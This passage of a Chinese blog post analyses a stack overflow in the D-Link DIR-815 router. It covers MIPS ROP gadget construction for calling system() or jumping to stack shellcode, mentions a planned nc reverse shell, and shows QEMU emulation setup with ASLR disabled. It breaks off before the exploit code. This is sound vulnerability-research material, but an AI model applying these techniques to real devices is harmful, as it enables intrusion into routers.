<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>DLink 815路由器栈溢出漏洞分析与复现 - Ghostasky&#39;s Blog</title><meta name="author" content="Ghostasky">
<meta name="author-link" content="">
<meta name="description" content="没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，" /><meta name="keywords" content='漏洞复现' />
  <meta itemprop="name" content="DLink 815路由器栈溢出漏洞分析与复现">
  <meta itemprop="description" content="没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，">
  <meta itemprop="datePublished" content="2022-10-23T00:00:00+00:00">
  <meta itemprop="dateModified" content="2022-10-23T00:00:00+00:00">
  <meta itemprop="wordCount" content="2935">
  <meta itemprop="keywords" content="漏洞复现"><meta property="og:url" content="http://ghostasky.github.io/posts/dir815/">
  <meta property="og:site_name" content="Ghostasky&#39;s Blog">
  <meta property="og:title" content="DLink 815路由器栈溢出漏洞分析与复现">
  <meta property="og:description" content="没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-10-23T00:00:00+00:00">
    <meta property="article:modified_time" content="2022-10-23T00:00:00+00:00">
    <meta property="article:tag" content="漏洞复现">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="DLink 815路由器栈溢出漏洞分析与复现">
  <meta name="twitter:description" content="没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/dir815/" /><link rel="prev" href="http://ghostasky.github.io/posts/2022-9-wincode1/" /><link rel="next" href="http://ghostasky.github.io/posts/2023-1-winkernel%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "DLink 815路由器栈溢出漏洞分析与复现",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/ghostasky.github.io\/posts\/dir815\/"
    },"genre": "posts","keywords": "漏洞复现","wordcount":  2935 ,
    "url": "http:\/\/ghostasky.github.io\/posts\/dir815\/","datePublished": "2022-10-23T00:00:00+00:00","dateModified": "2022-10-23T00:00:00+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Ghostasky"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="auto" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              >文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              >分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              >标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                >文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                >分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                >标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                >关于</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>DLink 815路由器栈溢出漏洞分析与复现</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky" data-title="Ghostasky" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ghostasky</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2022-10-23 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-10-23">2022-10-23</time></span>&nbsp;<span title="2935 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3000 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#mips架构特性">MIPS架构特性</a>
      <ul>
        <li><a href="#叶子函数与非叶子函数">叶子函数与非叶子函数</a></li>
        <li><a href="#流水线效应">流水线效应</a></li>
        <li><a href="#跳到某个函数的rop构造">跳到某个函数的ROP构造</a></li>
        <li><a href="#跳到shellcode的rop链构造">跳到shellcode的ROP链构造</a></li>
        <li><a href="#systemcmd的gadget">system(cmd)的gadget</a></li>
      </ul>
    </li>
    <li><a href="#环境搭建">环境搭建</a></li>
    <li><a href="#分析">分析</a></li>
    <li><a href="#exp">EXP</a>
      <ul>
        <li><a href="#qemu执行exp">qemu执行exp</a></li>
        <li><a href="#http请求发payload">http请求发payload：</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>没玩过IOT，搞个简单的分析下</p>
<p>踩了非常多的坑，光环境就搞了好久，，QAQ</p>
<h2 id="mips架构特性" class="heading-element"><span>MIPS架构特性</span>
  <a href="#mips%e6%9e%b6%e6%9e%84%e7%89%b9%e6%80%a7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="叶子函数与非叶子函数" class="heading-element"><span>叶子函数与非叶子函数</span>
  <a href="#%e5%8f%b6%e5%ad%90%e5%87%bd%e6%95%b0%e4%b8%8e%e9%9d%9e%e5%8f%b6%e5%ad%90%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>叶子函数：函数内没有调用其他函数，返回地址直接在<code>$ra</code>寄存器中2</li>
<li>非叶子函数：函数内调用其他函数，返回地址<code>$ra</code>首先通过<code>sw</code>放入栈中，之后返回时使用<code>lw</code>取出返回</li>
</ul>
<p>不只是<code>$ra</code>，其他寄存器如果使用到了的话也会放入栈中，比如<code>$s0 ~ $s7，$fp</code></p>
<p><code>$s0 ~ $s7, $fp, $ra</code>在栈中是由低到高放的，所以写payload的时候可以顺带控制</p>
<p><img loading="lazy" src="image-20221023001551632.png" alt="image-20221023001551632" srcset="image-20221023001551632.png?size=small, image-20221023001551632.png?size=medium 1.5x, image-20221023001551632.png?size=large 2x" data-title="image-20221023001551632" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="流水线效应" class="heading-element"><span>流水线效应</span>
  <a href="#%e6%b5%81%e6%b0%b4%e7%ba%bf%e6%95%88%e5%ba%94" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>常见的就是跳转指令，比如在没跳转之前，跳转指令的下一条指令(分支延迟槽)先执行，之后在跳转指令执行。</p>
<p>还有缓存不一致的问题，比如指令缓存器和数据缓存器，两者需要一个时间来同步，所以需要sleep，最好还是sleep一下。</p>
<h3 id="跳到某个函数的rop构造" class="heading-element"><span>跳到某个函数的ROP构造</span>
  <a href="#%e8%b7%b3%e5%88%b0%e6%9f%90%e4%b8%aa%e5%87%bd%e6%95%b0%e7%9a%84rop%e6%9e%84%e9%80%a0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>system函数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00053200</span>                 <span class="nf">li</span>      <span class="no">$gp</span><span class="p">,</span> <span class="p">(</span><span class="no">_GLOBAL_OFFSET_TABLE_</span><span class="err">+</span><span class="mi">0x7FF0</span> <span class="p">-</span> <span class="p">.)</span>  <span class="c1"># Alternative name is &#39;__libc_system&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00053208</span>                 <span class="nf">addu</span>    <span class="no">$gp</span><span class="p">,</span> <span class="no">$t9</span>
</span></span><span class="line"><span class="cl"><span class="na">..........</span>
</span></span><span class="line"><span class="cl"><span class="na">..........</span>
</span></span><span class="line"><span class="cl"><span class="na">..........</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000533</span><span class="nf">E0</span>                 <span class="no">jr</span>      <span class="no">$ra</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000533</span><span class="nf">E4</span>                 <span class="no">addiu</span>   <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x48</span></span></span></code></pre></div><p>最开始是从<code>$gp</code>寄存器里拿了个偏移之后与<code>$t9</code>相加，这时<code>$t9</code>是函数的首地址，也就是说跳转的时候要<code>jalr $t9</code>这种gadget。</p>
<p>最后返回的时候是<code>$ra</code>寄存器，就是说跳到这个函数前就要写好<code>$ra</code>寄存器，一般<code>move $t9,xxx</code>这种指令后会有<code>lw $ra,xxx; jr $t9</code></p>
<p>可以直接：<code>mipsrop.tail()</code>寻找gadget</p>
<p><img loading="lazy" src="image-20221023170945604.png" alt="image-20221023170945604" srcset="image-20221023170945604.png?size=small, image-20221023170945604.png?size=medium 1.5x, image-20221023170945604.png?size=large 2x" data-title="image-20221023170945604" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="跳到shellcode的rop链构造" class="heading-element"><span>跳到shellcode的ROP链构造</span>
  <a href="#%e8%b7%b3%e5%88%b0shellcode%e7%9a%84rop%e9%93%be%e6%9e%84%e9%80%a0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>mips一般都是栈溢出的同时将shellcode放到栈上，之后跳过去执行。得到shellcode的地址的话，可以使用如<code>addiu $s0, $sp, xxx</code>然后<code>move $t9, $s0 ; jalr $t9</code>跳过去，可以直接<code>mipsrop.stackfinder()</code></p>
<p><img loading="lazy" src="image-20221023171343705.png" alt="image-20221023171343705" srcset="image-20221023171343705.png?size=small, image-20221023171343705.png?size=medium 1.5x, image-20221023171343705.png?size=large 2x" data-title="image-20221023171343705" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="systemcmd的gadget" class="heading-element"><span>system(cmd)的gadget</span>
  <a href="#systemcmd%e7%9a%84gadget" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>这里会用到nc反弹shell的命令。</p>
<p>system的参数在<code>$a0</code>中，可以使用类似<code>addiu $s0, $sp, xxx ;move $a0, $s0</code>来实现，mempcpy函数会有上述的gadget：</p>
<p>由于流水线特性 ，跳过去之前<code>$a0</code>就已经给<code>$s2</code>了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B6C</span>                 <span class="no">addiu</span>   <span class="no">$s2</span><span class="p">,</span> <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x280</span><span class="err">+</span><span class="no">var_268</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B70</span>                 <span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$v1</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B74</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$s0</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B78</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c1">; mempcpy
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B7C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$s2</span></span></span></code></pre></div><h2 id="环境搭建" class="heading-element"><span>环境搭建</span>
  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>首先是binwalk，提取</p>
<p><img loading="lazy" src="image-20221021163527135.png" alt="image-20221021163527135" srcset="image-20221021163527135.png?size=small, image-20221021163527135.png?size=medium 1.5x, image-20221021163527135.png?size=large 2x" data-title="image-20221021163527135" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>32位MIPS小端</p>
<p><a href="https://people.debian.org/~aurel32/qemu/mipsel/"target="_blank" rel="external nofollow noopener noreferrer">https://people.debian.org/~aurel32/qemu/mipsel/</a></p>
<p>qemu-system-mipsel，系统模拟，下载mips内核镜像和文件系统</p>
<ul>
<li><code>debian_squeeze_mipsel_standard.qcow2</code>是文件系统</li>
<li><code>vmlinux-3.2.0-4-4kc-malta</code>是内核镜像</li>
</ul>
<p>qemu启动脚本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo qemu-system-mipsel <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-M malta <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-kernel vmlinux-3.2.0-4-4kc-malta <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-hda debian_squeeze_mipsel_standard.qcow2 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-append <span class="s2">&#34;root=/dev/sda1 console=tty0&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-net nic <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-net tap <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-nographic <span class="err">\</span></span></span></code></pre></div><p>网络配置：</p>
<p>网络配置工具：</p>
<pre tabindex="0"><code>sudo apt-get install bridge-utils uml-utilities</code></pre><p>配置下网络：</p>
<p>ubuntu:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo sysctl -w net.ipv4.ip<span class="se">\_</span>forward<span class="o">=</span><span class="m">1</span>  
</span></span><span class="line"><span class="cl">sudo iptables -F  
</span></span><span class="line"><span class="cl">sudo iptables -X  
</span></span><span class="line"><span class="cl">sudo iptables -t nat -F  
</span></span><span class="line"><span class="cl">sudo iptables -t nat -X  
</span></span><span class="line"><span class="cl">sudo iptables -t mangle -F  
</span></span><span class="line"><span class="cl">sudo iptables -t mangle -X  
</span></span><span class="line"><span class="cl">sudo iptables -P INPUT ACCEPT  
</span></span><span class="line"><span class="cl">sudo iptables -P FORWARD ACCEPT  
</span></span><span class="line"><span class="cl">sudo iptables -P OUTPUT ACCEPT  
</span></span><span class="line"><span class="cl">sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE  
</span></span><span class="line"><span class="cl">sudo iptables -I FORWARD <span class="m">1</span> -i tap0 -j ACCEPT  
</span></span><span class="line"><span class="cl">sudo iptables -I FORWARD <span class="m">1</span> -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT  
</span></span><span class="line"><span class="cl">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0</span></span></code></pre></div><p>qemu:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ifconfig eth0 192.168.100.2 netmask 255.255.255.0  
</span></span><span class="line"><span class="cl">route add default gw 192.168.100.254</span></span></code></pre></div><p>可以ping通：</p>
<p><img loading="lazy" src="image-20221021222854115.png" alt="image-20221021222854115" srcset="image-20221021222854115.png?size=small, image-20221021222854115.png?size=medium 1.5x, image-20221021222854115.png?size=large 2x" data-title="image-20221021222854115" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>auto.sh并执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</span></span><span class="line"><span class="cl">cp http_conf /
</span></span><span class="line"><span class="cl">cp sbin/httpd /
</span></span><span class="line"><span class="cl">cp -rf htdocs/ /
</span></span><span class="line"><span class="cl">mkdir /etc_bak
</span></span><span class="line"><span class="cl">cp -r /etc /etc_bak
</span></span><span class="line"><span class="cl">rm /etc/services
</span></span><span class="line"><span class="cl">cp -rf etc/ /
</span></span><span class="line"><span class="cl">cp lib/ld-uClibc-0.9.30.1.so  /lib/
</span></span><span class="line"><span class="cl">cp lib/libcrypt-0.9.30.1.so  /lib/
</span></span><span class="line"><span class="cl">cp lib/libc.so.0  /lib/
</span></span><span class="line"><span class="cl">cp lib/libgcc_s.so.1  /lib/
</span></span><span class="line"><span class="cl">cp lib/ld-uClibc.so.0  /lib/
</span></span><span class="line"><span class="cl">cp lib/libcrypt.so.0  /lib/
</span></span><span class="line"><span class="cl">cp lib/libgcc_s.so  /lib/
</span></span><span class="line"><span class="cl">cp lib/libuClibc-0.9.30.1.so  /lib/
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /
</span></span><span class="line"><span class="cl">rm -rf /htdocs/web/hedwig.cgi
</span></span><span class="line"><span class="cl">rm -rf /usr/sbin/phpcgi
</span></span><span class="line"><span class="cl">rm -rf /usr/sbin/hnap
</span></span><span class="line"><span class="cl">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
</span></span><span class="line"><span class="cl">ln -s /htdocs/cgibin /usr/sbin/phpcgi
</span></span><span class="line"><span class="cl">ln -s  /htdocs/cgibin /usr/sbin/hnap
